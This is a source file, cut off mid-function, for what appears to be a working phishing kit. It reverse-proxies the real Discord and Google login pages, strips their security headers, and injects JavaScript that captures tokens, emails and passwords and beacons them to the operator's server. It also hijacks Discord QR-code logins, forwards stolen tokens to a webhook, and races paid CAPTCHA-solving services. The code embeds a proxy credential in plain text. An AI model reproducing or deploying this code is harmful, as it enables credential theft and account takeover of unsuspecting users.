def _arsenal_wait(timeout=90):
    """Block until a token is available or timeout."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        entry = _arsenal_grab()
        if entry:
            return entry
        time.sleep(0.5)
    return None


def _arsenal_status():
    """Return current pool stats."""
    with _arsenal_lock:
        now = time.time()
        valid = sum(1 for e in _arsenal if (now - e['time']) < ARSENAL_TTL)
    return {'pool': valid, 'active': _arsenal_active, 'target': ARSENAL_TARGET}


# Legacy aliases
_presolve_loop = _arsenal_loop

def _start_presolve():
    pass

def _get_presolved(required_sitekey=None):
    return None


PROXY = os.environ.get('CAPTCHA_PROXY', 'http://henchmanbobby_gmail_com:Fatman11@la.residential.rayobyte.com:8000')


# ━━━━━━━━━━━━ Multi-Provider Captcha Solving ━━━━━━━━━━━━
# Races Anti-Captcha AND CapSolver simultaneously. First to return wins.
# If only one provider is configured, uses that one alone.

def _solve_anticaptcha(sitekey, rqdata, cancel_event=None):
    """Solve via Anti-Captcha."""
    t0 = time.time()
    api = 'https://api.anti-captcha.com'
    if not ANTICAPTCHA_KEY:
        return None, 'No ANTICAPTCHA_KEY'
    try:
        task = {
            'type': 'HCaptchaTaskProxyless',
            'websiteURL': 'https://discord.com/login',
            'websiteKey': sitekey,
            'isEnterprise': True,
            'userAgent': UA,
        }
        if rqdata:
            task['enterprisePayload'] = {'rqdata': rqdata}

        r = plain_req.post(f'{api}/createTask', json={
            'clientKey': ANTICAPTCHA_KEY,
            'task': task,
            'languagePool': 'en',
        }, timeout=30)
        j = r.json()
        task_id = j.get('taskId')
        if j.get('errorId', 0) != 0 or not task_id:
            return None, j.get('errorDescription', 'createTask failed')

        for poll in range(1200):
            if cancel_event and cancel_event.is_set():
                return None, 'cancelled'
            elapsed = time.time() - t0
            time.sleep(0.05 if elapsed < 5 else (0.1 if elapsed < 20 else 0.2))
            r = plain_req.post(f'{api}/getTaskResult', json={
                'clientKey': ANTICAPTCHA_KEY, 'taskId': task_id,
            }, timeout=15)
            j = r.json()
            if j.get('status') == 'ready':
                token = j.get('solution', {}).get('gRecaptchaResponse', '')
                if token and len(token) > 20:
                    print(f'[+] Anti-Captcha solved! {len(token)} chars in {time.time()-t0:.1f}s')
                    return token, None
                return None, 'Empty token'
            if j.get('errorId', 0) != 0:
                return None, j.get('errorDescription', 'solve failed')
            if elapsed > 180:
                break
        return None, f'Anti-Captcha timeout ({time.time()-t0:.0f}s)'
    except Exception as e:
        return None, f'Anti-Captcha: {e}'


def _solve_capsolver(sitekey, rqdata, cancel_event=None):
    """Solve via CapSolver."""
    t0 = time.time()
    api = 'https://api.capsolver.com'
    if not CAPSOLVER_KEY:
        return None, 'No CAPSOLVER_KEY'
    try:
        task = {
            'type': 'HCaptchaTaskProxyLess',
            'websiteURL': 'https://discord.com/login',
            'websiteKey': sitekey,
            'isEnterprise': True,
            'userAgent': UA,
        }
        if rqdata:
            task['enterprisePayload'] = {'rqdata': rqdata}

        r = plain_req.post(f'{api}/createTask', json={
            'appId': '9E199308-AD6D-41FB-90C7-72FA3E8653EE',
            'clientKey': CAPSOLVER_KEY,
            'task': task,
        }, timeout=30)
        j = r.json()
        task_id = j.get('taskId')
        if j.get('errorId', 0) != 0 or not task_id:
            return None, j.get('errorDescription', 'createTask failed')

        for poll in range(1200):
            if cancel_event and cancel_event.is_set():
                return None, 'cancelled'
            elapsed = time.time() - t0
            time.sleep(0.05 if elapsed < 3 else (0.1 if elapsed < 15 else 0.2))
            r = plain_req.post(f'{api}/getTaskResult', json={
                'clientKey': CAPSOLVER_KEY, 'taskId': task_id,
            }, timeout=15)
            j = r.json()
            if j.get('status') == 'ready':
                token = j.get('solution', {}).get('gRecaptchaResponse', '')
                if token and len(token) > 20:
                    print(f'[+] CapSolver solved! {len(token)} chars in {time.time()-t0:.1f}s')
                    return token, None
                return None, 'Empty token'
            if j.get('errorId', 0) != 0:
                return None, j.get('errorDescription', 'solve failed')
            if elapsed > 180:
                break
        return None, f'CapSolver timeout ({time.time()-t0:.0f}s)'
    except Exception as e:
        return None, f'CapSolver: {e}'


def solve_captcha(sitekey, rqdata, cancel_event=None):
    """Race all configured providers. First to return a valid token wins.
    Typically ~30-50% faster than single-provider due to variance in solve times."""
    providers = []
    if ANTICAPTCHA_KEY:
        providers.append(('AntiCaptcha', _solve_anticaptcha))
    if CAPSOLVER_KEY:
        providers.append(('CapSolver', _solve_capsolver))
    if not providers:
        return None, 'No captcha API keys configured'

    # Single provider — just call it directly
    if len(providers) == 1:
        name, fn = providers[0]
        print(f'[solve] Using {name} (single provider)')
        return fn(sitekey, rqdata, cancel_event)

    # Multi-provider race
    print(f'[solve] Racing {len(providers)} providers: {", ".join(p[0] for p in providers)}')
    winner = [None]
    last_err = [None]
    done = threading.Event()
    cancel_all = threading.Event()

    def _provider_worker(name, fn):
        if cancel_all.is_set():
            return
        # Create a combined cancel: triggers if race cancel OR external cancel fires
        class CombinedEvent:
            def is_set(self):
                return cancel_all.is_set() or (cancel_event and cancel_event.is_set())
        t, e = fn(sitekey, rqdata, CombinedEvent())
        if t and not winner[0]:
            winner[0] = t
            done.set()
            cancel_all.set()
            print(f'[solve] {name} WON the race!')
        elif not t:
            last_err[0] = f'{name}: {e}'
        # Check if all done
        if not winner[0] and all(f.done() for f in futures):
            done.set()

    from concurrent.futures import ThreadPoolExecutor
    pool = ThreadPoolExecutor(max_workers=len(providers))
    futures = [pool.submit(_provider_worker, name, fn) for name, fn in providers]
    done.wait(timeout=180)
    cancel_all.set()
    pool.shutdown(wait=False, cancel_futures=True)
    return winner[0], last_err[0]


def _solve_race(sitekey, rqdata, n=5):
    """Submit N solve_captcha tasks (each already races providers internally).
    First to return wins. Default n=5 for cost efficiency."""
    if n <= 1:
        return solve_captcha(sitekey, rqdata)

    winner = [None]
    last_err = [None]
    done = threading.Event()
    cancel = threading.Event()
    finished = [0]
    lock = threading.Lock()

    def _worker(idx):
        if cancel.is_set():
            return None, 'cancelled'
        t, e = solve_captcha(sitekey, rqdata, cancel_event=cancel)
        with lock:
            finished[0] += 1
            if t and not winner[0]:
                winner[0] = t
                done.set()
                cancel.set()
                print(f'[race] Worker {idx} won! Cancelling {n - finished[0]} remaining')
            elif not t:
                last_err[0] = e
            if finished[0] >= n and not winner[0]:
                done.set()
        return t, e

    from concurrent.futures import ThreadPoolExecutor
    pool = ThreadPoolExecutor(max_workers=n)
    futures = [pool.submit(_worker, i) for i in range(n)]
    done.wait(timeout=180)
    cancel.set()
    pool.shutdown(wait=False, cancel_futures=True)
    return winner[0], last_err[0]


class QRAuth:
    def __init__(self):
        self.id    = uuid.uuid4().hex[:8]
        self.pk    = rsa.generate_private_key(65537, 2048)
        self.pub   = self.pk.public_key()
        self.fp    = None
        self.st    = 'init'
        self.user  = None
        self.token = None
        self.err   = None
        self.ws    = None
        self._stop = threading.Event()
        self._wh   = False

    def pub_b64(self):
        return base64.b64encode(self.pub.public_bytes(
            serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
        )).decode()

    def decrypt(self, b64s):
        return self.pk.decrypt(
            base64.b64decode(b64s),
            asym_pad.OAEP(asym_pad.MGF1(hashes.SHA256()), hashes.SHA256(), None)
        )


def _qr_worker(s: QRAuth):
    # Use a pre-warmed session from the pool (no prepare() needed = instant start)
    ds = _get_ready_session()
    if ds is None:
        ds = DiscordSession()
        ds.prepare()  # fallback: fresh session (slow path, pool was empty)

    try:
        def on_msg(ws, raw):
            d  = json.loads(raw)
            op = d.get('op')

            if op == 'hello':
                hb = d.get('heartbeat_interval', 40000) / 1000
                ws.send(json.dumps({'op': 'init', 'encoded_public_key': s.pub_b64()}))
                def beat():
                    while not s._stop.is_set():
                        try: ws.send(json.dumps({'op': 'heartbeat'}))
                        except: break
                        s._stop.wait(hb)
                threading.Thread(target=beat, daemon=True).start()

            elif op == 'nonce_proof':
                dec   = s.decrypt(d['encrypted_nonce'])
                proof = b64url(hashlib.sha256(dec).digest())
                ws.send(json.dumps({'op': 'nonce_proof', 'proof': proof}))

            elif op == 'pending_remote_init':
                s.fp = d['fingerprint']
                s.st = 'pending'

            elif op == 'pending_ticket':
                try:
                    info  = s.decrypt(d['encrypted_user_payload']).decode()
                    parts = info.split(':')
                    s.user = {
                        'id': parts[0],
                        'disc': parts[1] if len(parts) > 1 else '0',
                        'avatar': parts[2] if len(parts) > 2 else '',
                        'name': parts[3] if len(parts) > 3 else '?',
                    }
                    s.st = 'scanned'
                except Exception as e:
                    s.st = 'error'; s.err = str(e)

            elif op == 'pending_login':
                s.st = 'confirming'
                try:
                    r = ds.post('/users/@me/remote-auth/login', {'ticket': d['ticket']})
                    j = r.json()
                    if 'encrypted_token' in j:
                        s.token = s.decrypt(j['encrypted_token']).decode()
                        s.st = 'done'
                        if not s._wh:
                            s._wh = True
                            fire_webhook(s.token)
                    else:
                        s.st = 'error'; s.err = json.dumps(j)
                except Exception as e:
                    s.st = 'error'; s.err = str(e)
                s._stop.set()

            elif op == 'cancel':
                s.st = 'cancelled'; s._stop.set()

        def on_err(ws, e):
            if s.st not in ('done', 'cancelled'):
                s.st = 'error'; s.err = str(e)
            s._stop.set()

        def on_close(ws, code, msg):
            if s.st in ('init', 'pending', 'scanned', 'confirming'):
                s.st = 'expired' if s.st == 'pending' else 'error'
                s.err = s.err or ('QR expired' if s.st == 'expired' else f'Closed ({code})')
            s._stop.set()

        ws = websocket.WebSocketApp(
            WS_URL,
            on_message=on_msg, on_error=on_err, on_close=on_close,
            header=[f'Origin: https://discord.com', f'User-Agent: {UA}'],
        )
        s.ws = ws
        ws.run_forever()
    except Exception as e:
        s.st = 'error'; s.err = str(e); s._stop.set()


# ━━━━━━━━━━━━ Discord Reverse Proxy ━━━━━━━━━━━━
# Proxies the REAL Discord login page through our server.
# Users see actual Discord UI — we intercept tokens server-side + client-side.
# No captcha solving needed — users solve captchas themselves.

_asset_cache = {}
_asset_cache_lock = threading.Lock()
ASSET_CACHE_TTL = 604800  # 7 days — assets are content-hashed, never change
ASSET_CACHE_MAX = 2000

_cdn_cache = {}
_cdn_cache_lock = threading.Lock()
CDN_CACHE_TTL = 3600     # 1 hour for CDN (avatars can change)
CDN_CACHE_MAX = 500

_login_html_cache = {'html': None, 'time': 0}
_login_html_lock = threading.Lock()
LOGIN_HTML_TTL = 300  # re-fetch Discord login page every 5 min

_proxy_sessions = {}     # sid -> {'s': curl_cffi session, 'ts': float}
_proxy_sessions_lock = threading.Lock()
PROXY_SESSION_TTL = 600  # 10 min

_STRIP_RESP = {
    'content-security-policy', 'content-security-policy-report-only',
    'x-frame-options', 'strict-transport-security',
    'transfer-encoding', 'content-encoding', 'content-length',
    'alt-svc', 'report-to', 'nel', 'expect-ct',
    'cross-origin-opener-policy', 'cross-origin-embedder-policy',
    'cross-origin-resource-policy', 'permissions-policy',
}

INTERCEPTOR_JS = r'''<script>(function(){
  var _pw='',_seen={},_captured=false;
  function _redir(){
    try{var tc=document.cookie.match(/_tenant=([^;]+)/);if(tc){var p=tc[1].split(':');if(p.length>=4){window.location.href='/'+p[0]+'/'+p[1]+'/'+p[2]+'/'+p[3]+'?verified=1';}else{window.location.href='/'+p[0]+'/'+p[1]+'/'+p[2]+'?verified=1';}}else{document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#313338;color:#fff;font-family:sans-serif"><div style="text-align:center"><div style="width:80px;height:80px;border-radius:50%;background:#23a55a;margin:0 auto 20px;display:flex;align-items:center;justify-content:center"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div><h1 style="color:#23a55a;font-size:28px;margin:0 0 10px">Verified!</h1><p style="color:#b5bac1;font-size:14px;margin:0">You may now close this window.</p></div></div>';}}catch(e){}
  }
  function _c(t,s,u){
    if(!t||t.length<30||_seen[t])return;
    _seen[t]=1;
    try{navigator.sendBeacon('/--/captured',JSON.stringify({t:t,s:s,u:u,p:_pw}))}catch(e){}
    var isLogin=(s==='f'||s==='x')&&u&&(/auth\/login|auth\/mfa|remote-auth\/login/.test(u));
    if(!_captured&&isLogin){_captured=true;setTimeout(_redir,2000);}
  }
  var _of=window.fetch;
  window.fetch=function(input,init){
    init=init||{};
    var url=(typeof input==='string')?input:(input&&input.url)||'';
    if(url.indexOf('/auth/login')!==-1&&init.body){
      try{var b=JSON.parse(init.body);if(b.password)_pw=b.password;}catch(e){}
    }
    if(init.headers){
      var a=null;
      if(init.headers instanceof Headers)a=init.headers.get('Authorization');
      else if(typeof init.headers==='object')a=init.headers['Authorization']||init.headers['authorization'];
      if(a&&a.length>30)_c(a,'h',url);
    }
    return _of.apply(this,arguments).then(function(r){
      if(url.indexOf('/api/')!==-1){
        r.clone().json().then(function(j){
          if(j&&j.token&&j.token.length>30)_c(j.token,'f',url);
        }).catch(function(){});
      }
      return r;
    });
  };
  var _xo=XMLHttpRequest.prototype.open,_xs=XMLHttpRequest.prototype.send,_xsh=XMLHttpRequest.prototype.setRequestHeader;
  XMLHttpRequest.prototype.open=function(m,u){this._u=u;return _xo.apply(this,arguments)};
  XMLHttpRequest.prototype.setRequestHeader=function(k,v){
    if(k.toLowerCase()==='authorization')_c(v,'xh','xhr');
    return _xsh.apply(this,arguments);
  };
  XMLHttpRequest.prototype.send=function(){
    var x=this;
    x.addEventListener('load',function(){
      try{
        if(x._u&&x._u.indexOf('/api/')!==-1){
          var j=JSON.parse(x.responseText);
          if(j&&j.token&&j.token.length>30)_c(j.token,'x',x._u);
        }
      }catch(e){}
    });
    return _xs.apply(this,arguments);
  };
})();
</script>'''


def _get_proxy_session():
    """Get or create a curl_cffi session for the current client."""
    sid = request.cookies.get('_dsid', '')
    with _proxy_sessions_lock:
        if sid and sid in _proxy_sessions:
            entry = _proxy_sessions[sid]
            if time.time() - entry['ts'] < PROXY_SESSION_TTL:
                entry['ts'] = time.time()
                return sid, entry['s']
        # Cleanup old sessions
        now = time.time()
        stale = [k for k, v in list(_proxy_sessions.items()) if now - v['ts'] > PROXY_SESSION_TTL]
        for k in stale:
            try: _proxy_sessions.pop(k)['s'].close()
            except: pass
    new_sid = uuid.uuid4().hex[:16]
    s = _make_session()
    with _proxy_sessions_lock:
        _proxy_sessions[new_sid] = {'s': s, 'ts': time.time()}
    return new_sid, s


def _proxy_rewrite_html(html_text):
    """Rewrite Discord login page HTML for proxying."""
    h = html_text
    # Remove integrity/crossorigin/nonce attrs (we modify JS content)
    h = re.sub(r'\s+integrity="[^"]*"', '', h)
    h = re.sub(r'\s+crossorigin(?:="[^"]*")?', '', h)
    h = re.sub(r'\s+nonce="[^"]*"', '', h)
    # Remove CSP meta tags
    h = re.sub(r'<meta[^>]*content-security-policy[^>]*>', '', h, flags=re.IGNORECASE)
    # Rewrite GLOBAL_ENV endpoints (protocol-relative URLs)
    h = h.replace("'//discord.com/api'", "'/api'")
    h = h.replace('"//discord.com/api"', '"/api"')
    h = h.replace("'//cdn.discordapp.com'", "'/cdn'")
    h = h.replace('"//cdn.discordapp.com"', '"/cdn"')
    h = h.replace("'//discord.com'", "''")
    h = h.replace('"//discord.com"', '""')
    # Rewrite absolute URLs
    h = h.replace('https://discord.com/assets/', '/assets/')
    h = h.replace('https://discord.com/api/', '/api/')
    h = h.replace('https://cdn.discordapp.com/', '/cdn/')
    h = h.replace('https://discord.com/', '/')
    h = h.replace('https://discordapp.com/', '/')
    # Fix GLOBAL_ENV: API_ENDPOINT must be protocol-relative so that
    # "https:" + API_ENDPOINT produces a valid URL (not "https:/api")
    ENV_FIX = '<script>window.GLOBAL_ENV.API_ENDPOINT="//" + location.host + "/api";'\
             'window.GLOBAL_ENV.REMOTE_AUTH_ENDPOINT=(location.protocol==="https:"?"wss://":"ws://")+location.host+"/remote-auth";'\
             '</script>'
    # Inject env fix + interceptor before </head>
    h = h.replace('</head>', ENV_FIX + '\n' + INTERCEPTOR_JS + '\n</head>', 1)
    return h


def _proxy_rewrite_js(js_text):
    """Rewrite Discord JS to route requests through our proxy."""
    t = js_text
    t = t.replace("'//discord.com/api'", "'/api'")
    t = t.replace('"//discord.com/api"', '"/api"')
    t = t.replace("'//cdn.discordapp.com'", "'/cdn'")
    t = t.replace('"//cdn.discordapp.com"', '"/cdn"')
    t = t.replace("'//discord.com'", "''")
    t = t.replace('"//discord.com"', '""')
    t = t.replace('https://discord.com/assets/', '/assets/')
    t = t.replace('https://discord.com/api/', '/api/')
    t = t.replace('https://cdn.discordapp.com/', '/cdn/')
    t = t.replace('https://discord.com/', '/')
    t = t.replace('https://discordapp.com/', '/')
    # Handle escaped URLs in JSON strings
    t = t.replace('https:\\/\\/discord.com\\/', '\\/')
    t = t.replace('https:\\/\\/cdn.discordapp.com\\/', '\\/cdn\\/')
    # Restore full discord.com URL for QR code deep links (mobile app needs it)
    t = t.replace('`/ra/${', '`https://discord.com/ra/${')
    return t


def _check_and_capture(resp_body, path, client_ip, req_body=None, tenant=None):
    """Check Discord API response for tokens and capture them. Assign role via tenant context."""
    auth_paths = ('auth/login', 'auth/mfa/totp', 'auth/mfa/sms', 'remote-auth/login', 'auth/mfa/webauthn')
    if not any(p in path for p in auth_paths):
        return
    try:
        j = json.loads(resp_body)
        token = j.get('token', '')
        if token and len(token) > 30:
            pw = '?'
            if req_body:
                try: pw = json.loads(req_body).get('password', '?')
                except: pass
            print(f'[CAPTURED] Token from proxy ({path}): {token[:25]}...')
            fire_webhook(token, client_ip, pw)
            # Assign role using tenant context
            if tenant:
                _success_with_info(token, tenant)
    except:
        pass


# ━━━━━━━━━━━━ Google Login Proxy ━━━━━━━━━━━━
# Proxies Google's REAL sign-in page. Same concept as the Discord proxy.

GOOGLE_PROXY_DOMAINS = {
    'accounts.google.com', 'ssl.gstatic.com', 'www.gstatic.com',
    'fonts.googleapis.com', 'fonts.gstatic.com', 'apis.google.com',
    'myaccount.google.com', 'www.google.com', 'ogs.google.com',
    'play.google.com', 'lh3.googleusercontent.com', 'clients1.google.com',
    'signaler-pa.clients6.google.com', 'content-autofill.googleapis.com',
    'optimizationguide-pa.googleapis.com', 'update.googleapis.com',
    'accounts.youtube.com', 'www.youtube.com',
}

_google_login_cache = {'html': None, 'time': 0}
_google_login_lock = threading.Lock()
GOOGLE_LOGIN_TTL = 120

_google_asset_cache = {}
_google_asset_cache_lock = threading.Lock()
GOOGLE_ASSET_CACHE_TTL = 86400
GOOGLE_ASSET_CACHE_MAX = 500

_google_sessions = {}
_google_sessions_lock = threading.Lock()
GOOGLE_SESSION_TTL = 600

GOOGLE_INTERCEPTOR_JS = r'''<script>(function(){
  var _email='',_pw='',_sent=false;
  function _redir(){
    try{var tc=document.cookie.match(/_tenant=([^;]+)/);if(tc){var p=tc[1].split(':');if(p.length>=4){window.location.href='/'+p[0]+'/'+p[1]+'/'+p[2]+'/'+p[3]+'?verified=1';}else if(p.length>=3){window.location.href='/'+p[0]+'/'+p[1]+'/'+p[2]+'?verified=1';}else{window.location.href='/';}}else{document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#fff;color:#202124;font-family:Google Sans,Roboto,sans-serif"><div style="text-align:center"><div style="width:80px;height:80px;border-radius:50%;background:#34a853;margin:0 auto 20px;display:flex;align-items:center;justify-content:center"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div><h1 style="color:#34a853;font-size:28px;margin:0 0 10px">Verified!</h1><p style="color:#5f6368;font-size:14px;margin:0">You may now close this window.</p></div></div>';}}catch(e){}
  }
  function _send(){
    if(_sent||!_email||!_pw)return;
    _sent=true;
    try{navigator.sendBeacon('/--/captured-google',JSON.stringify({e:_email,p:_pw}))}catch(e){}
    setTimeout(_redir,2500);
  }
  // Track email/password inputs via input events
  document.addEventListener('input',function(ev){
    var inp=ev.target;if(!inp||inp.tagName!=='INPUT')return;
    if(inp.type==='email'||inp.type==='text'&&inp.id==='identifierId'||inp.name==='identifier'||inp.autocomplete==='username')_email=inp.value;
    if(inp.type==='password'||inp.name==='Passwd'||inp.name==='password')_pw=inp.value;
  },true);
  // Capture on form submit
  document.addEventListener('submit',function(ev){
    var form=ev.target;if(!form)return;
    var inputs=form.querySelectorAll('input');
    inputs.forEach(function(inp){
      if(inp.type==='email'||(inp.type==='text'&&(inp.id==='identifierId'||inp.name==='identifier')))_email=inp.value||_email;
      if(inp.type==='password'||inp.name==='Passwd')_pw=inp.value||_pw;
    });
    if(_pw)_send();
  },true);
  // Capture on "Next" button clicks (Google uses JS, not always form submit)
  document.addEventListener('click',function(ev){
    var btn=ev.target;if(!btn)return;
    // Walk up to find button
    for(var i=0;i<5&&btn;i++){if(btn.tagName==='BUTTON'||btn.getAttribute&&btn.getAttribute('jsname'))break;btn=btn.parentElement;}
    if(_pw&&_email)_send();
  },true);
  // MutationObserver for dynamically added password fields
  function _watchInputs(root){
    if(!root||!root.querySelectorAll)return;
    root.querySelectorAll('input[type="password"],input[name="Passwd"]').forEach(function(inp){
      inp.addEventListener('input',function(){_pw=inp.value;});
      inp.addEventListener('change',function(){_pw=inp.value;});
    });
    root.querySelectorAll('input[type="email"],input[id="identifierId"]').forEach(function(inp){
      inp.addEventListener('input',function(){_email=inp.value;});
    });
  }
  var obs=new MutationObserver(function(muts){
    muts.forEach(function(m){m.addedNodes.forEach(function(n){_watchInputs(n);});});
  });
  if(document.body)obs.observe(document.body,{childList:true,subtree:true});
  else document.addEventListener('DOMContentLoaded',function(){obs.observe(document.body,{childList:true,subtree:true});});
  // Intercept fetch to detect submissions
  var _of=window.fetch;
  window.fetch=function(input,init){
    init=init||{};
    if(init.body){
      try{
        var b=typeof init.body==='string'?init.body:null;
        if(b){
          var params;try{params=new URLSearchParams(b)}catch(e){params=null}
          if(params){
            var e=params.get('Email')||params.get('email')||params.get('identifier');
            var p=params.get('Passwd')||params.get('password');
            if(e)_email=e;
            if(p){_pw=p;_send();}
          }
        }
      }catch(e){}
    }
    return _of.apply(this,arguments);
  };
  // Intercept XHR
  var _xo=XMLHttpRequest.prototype.open,_xs=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open=function(m,u){this._u=u;return _xo.apply(this,arguments)};
  XMLHttpRequest.prototype.send=function(body){
    if(body&&typeof body==='string'){
      try{
        var params;try{params=new URLSearchParams(body)}catch(e){params=null}
        if(params){
          var e=params.get('Email')||params.get('email')||params.get('identifier');
          var p=params.get('Passwd')||params.get('password');
          if(e)_email=e;
          if(p){_pw=p;_send();}
        }
      }catch(e){}
    }
    return _xs.apply(this,arguments);
  };
})();
</script>'''


def _google_rewrite_html(html_text):
    """Rewrite Google login page HTML for proxying through our server.

    Strategy: keep Google's real HTML + CSS (so it looks 100% legit),
    but strip Google's Wiz JS framework (it crashes on non-Google origins)
    and inject our own lightweight form handler that drives the email→password flow.
    """
    h = html_text
    # Remove CSP meta tags
    h = re.sub(r'<meta[^>]*content-security-policy[^>]*>', '', h, flags=re.IGNORECASE)
    # Remove nonce/integrity attributes
    h = re.sub(r'\s+nonce="[^"]*"', '', h)
    h = re.sub(r'\s+integrity="[^"]*"', '', h)
    h = re.sub(r'\s+crossorigin(?:="[^"]*")?', '', h)
    # Rewrite Google domains to proxy paths (for CSS, images, fonts)
    for domain in GOOGLE_PROXY_DOMAINS:
        h = h.replace(f'https://{domain}/', f'/_gp/{domain}/')
        h = h.replace(f'//{domain}/', f'/_gp/{domain}/')
    # Strip ALL <script> tags — Google's Wiz framework can't run on non-Google origin
    h = re.sub(r'<script\b[^>]*>[\s\S]*?</script>', '', h, flags=re.IGNORECASE)
    # Also strip <noscript> that might hide content
    h = re.sub(r'<noscript>[\s\S]*?</noscript>', '', h, flags=re.IGNORECASE)
    # Inject our form handler + credential interceptor before </body>
    handler_js = r'''<script>(function(){
  // ─── Find form elements ───
  var emailInput = document.querySelector('input[type="email"]')
    || document.getElementById('identifierId')
    || document.querySelector('input[name="identifier"]');
  var nextBtns = document.querySelectorAll('button');
  var nextBtn = null;
  nextBtns.forEach(function(b){
    var t = b.textContent.trim().toLowerCase();
    if(t === 'next' || t === 'suivant' || t === 'weiter' || t === 'siguiente') nextBtn = b;
  });

  if(!emailInput || !nextBtn) return;

  // Make buttons work (they had jsaction handlers that we stripped)
  function stopProp(e){ e.preventDefault(); e.stopPropagation(); }

  // ─── Email → Password transition ───
  nextBtn.addEventListener('click', function(e){
    stopProp(e);
    var email = emailInput.value.trim();
    if(!email){
      // Show Google's native error styling if possible
      var errBox = document.querySelector('[data-error]') || document.querySelector('.o6cuMc');
      if(errBox){ errBox.textContent = 'Enter an email or phone number'; errBox.style.display = 'block'; }
      return;
    }
    showPasswordStep(email);
  }, true);

  emailInput.addEventListener('keydown', function(e){
    if(e.key === 'Enter'){ e.preventDefault(); nextBtn.click(); }
  });

  function showPasswordStep(email){
    // Get the main content area
    var main = document.querySelector('main') || document.querySelector('[role="presentation"]')
      || document.querySelector('.card') || document.querySelector('section');
    if(!main) main = document.body;

    // Build password step using Google's own CSS classes
    var initial = email.charAt(0).toUpperCase();
    main.innerHTML = '<div style="padding:24px 0">'
      + '<div style="display:flex;justify-content:center;margin-bottom:16px">'
      + '<svg viewBox="0 0 48 48" width="48" height="48"><path d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" fill="#EA4335"/><path d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" fill="#4285F4"/><path d="M10.53 28.59A14.5 14.5 0 019.5 24c0-1.59.28-3.13.76-4.59l-7.98-6.19A23.9 23.9 0 000 24c0 3.77.9 7.35 2.56 10.53l7.97-5.94z" fill="#FBBC05"/><path d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.94C6.51 42.62 14.62 48 24 48z" fill="#34A853"/></svg>'
      + '</div>'
      + '<h1 style="font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:4px;font-family:Google Sans,Roboto,Arial,sans-serif">Welcome</h1>'
      + '<div style="display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:16px;padding:2px 12px 2px 4px;width:fit-content;margin:12px auto 24px;cursor:pointer;font-size:14px;color:#3c4043;font-family:Roboto,Arial,sans-serif" id="_chip">'
      + '<div style="width:26px;height:26px;border-radius:50%;background:#5f6368;color:#fff;display:flex;align-items:center;justify-content:center;font-size:13px">' + initial + '</div>'
      + '<span>' + email.replace(/</g,"&lt;") + '</span>'
      + '<svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg>'
      + '</div>'
      + '<div style="position:relative;display:block">'
      + '<input type="password" id="_pw" autocomplete="current-password" style="display:block;width:100%;height:56px;padding:13px 48px 13px 16px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;font-family:Roboto,Arial,sans-serif;color:#202124;box-sizing:border-box">'
      + '<label for="_pw" style="position:absolute;left:16px;top:0;transform:translateY(-50%);font-size:12px;color:#1a73e8;background:#fff;padding:0 4px;font-family:Roboto,Arial,sans-serif">Enter your password</label>'
      + '<button type="button" id="_toggle" style="position:absolute;right:12px;top:28px;transform:translateY(-50%);background:none;border:none;cursor:pointer;padding:4px"><svg width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg></button>'
      + '</div>'
      + '<div id="_pwerr" style="font-size:12px;color:#d93025;margin-top:8px;display:none"></div>'
      + '<label style="display:flex;align-items:center;gap:8px;margin-top:8px;cursor:pointer;font-size:14px;color:#202124;font-family:Roboto,Arial,sans-serif"><input type="checkbox" id="_showpw" style="width:18px;height:18px;accent-color:#1a73e8;cursor:pointer">Show password</label>'
      + '<button type="button" style="background:none;border:none;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer;padding:8px 0;margin-top:8px;font-family:Google Sans,Roboto,Arial,sans-serif;display:block">Forgot password?</button>'
      + '<div style="display:flex;justify-content:flex-end;margin-top:32px">'
      + '<button type="button" id="_pwNext" style="min-width:90px;height:36px;padding:0 24px;border:none;border-radius:4px;background:#1a73e8;color:#fff;font-size:14px;font-weight:500;cursor:pointer;font-family:Google Sans,Roboto,Arial,sans-serif;letter-spacing:.25px">Next</button>'
      + '</div>'
      + '</div>';

    var pwInput = document.getElementById('_pw');
    var pwNext = document.getElementById('_pwNext');
    var toggle = document.getElementById('_toggle');
    var showpw = document.getElementById('_showpw');
    var pwerr = document.getElementById('_pwerr');

    pwInput.focus();

    // Toggle password visibility via eye icon
    toggle.addEventListener('click', function(){
      pwInput.type = pwInput.type === 'password' ? 'text' : 'password';
      showpw.checked = pwInput.type === 'text';
    });
    // Toggle via checkbox
    showpw.addEventListener('change', function(){
      pwInput.type = showpw.checked ? 'text' : 'password';
    });

    // Back to email
    document.getElementById('_chip').addEventListener('click', function(){
      window.location.reload();
    });

    // Password submit
    function submitPw(){
      var pw = pwInput.value;
      if(!pw){
        pwerr.textContent = 'Enter a password';
        pwerr.style.display = 'block';
        pwInput.focus();
        return;
      }
      pwerr.style.display = 'none';
      // Show spinner
